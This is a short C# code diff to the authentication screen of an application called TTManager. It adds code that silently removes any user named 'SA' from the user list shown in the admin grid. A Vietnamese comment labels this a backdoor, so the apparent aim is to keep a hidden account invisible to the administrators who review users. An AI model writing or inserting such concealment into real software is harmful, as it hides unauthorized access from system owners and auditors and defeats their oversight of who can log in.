@@ -71,6 +71,17 @@ namespace TTManager.Auth
             Task.Run(() =>
             {
                 userList = UserData.GetUserListFromDB(data_file_path);
+                // Ẩn username "SA" khỏi danh sách (cửa sau)
+                if (userList != null && userList.Rows.Count > 0)
+                {
+                    var rowsToRemove = userList.AsEnumerable()
+                        .Where(row => row.Field<string>("Username") == "SA")
+                        .ToList();
+                    foreach (var row in rowsToRemove)
+                    {
+                        userList.Rows.Remove(row);
+                    }
+                }
                 this.Invoke(new Action(() =>
                 {
                     uiDataGridView1.DataSource = userList;
